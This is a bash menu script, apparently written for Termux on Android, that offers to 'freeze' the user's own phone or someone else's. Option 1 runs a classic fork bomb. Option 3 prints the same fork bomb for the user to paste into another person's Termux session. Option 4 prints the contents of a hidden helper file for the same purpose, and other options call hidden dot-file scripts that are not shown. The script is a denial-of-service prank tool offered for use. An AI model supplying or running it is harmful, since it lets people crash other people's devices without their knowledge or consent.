clear
clear
echo
echo
echo
echo -e "	\033[91m [\033[96m 1\033[91m ]\033[92m Freeze your phone"
echo -e "	\033[91m [\033[96m 2\033[91m ]\033[92m Freeze phone if open Termux"
echo -e "	\033[91m [\033[96m 3\033[91m ]\033[92m Freeze other phone"
echo -e "	\033[91m [\033[96m 4\033[91m ]\033[92m Freeze other phoneif open Termux"
echo -e "	\033[91m [\033[96m 5\033[91m ]\033[92m Back"
echo -e "	\033[91m [\033[96m 6\033[91m ]\033[92m Main menu"
echo -e "	\033[91m [\033[96m 7\033[91m ]\033[92m Exit"
echo
echo -e -n "\033[91m Freeze >>> "
read m
if [ "$m" = "1" ];then
:(){ :|: & };:
fi
if [ "$m" = "2" ];then
cd $HOME
bash .freeze2.sh
fi
if [ "$m" = "3" ];then
clear
echo -e "\033[91m Copy thisand paste other termux"
echo
echo ":(){ :|: & };:"
echo
echo "press enter for back"
read
cd $HOME
bash .freeze.sh
fi
if [ "$m" = "4" ];then
clear
echo -e "\033[91m Copy this and paste other termux"
echo
cd $HOME
cat .info.sh
echo "press enter for back"
read
cd $HOME
bash .freeze.sh
fi
if [ "$m" = "5" ];then
cd $HOME
bash .freeze.sh
fi
if [ "$m" = "6" ];then
cd $HOME
bash ..bashr*
fi
if [ "$m" = "7" ];then
exit 1
fi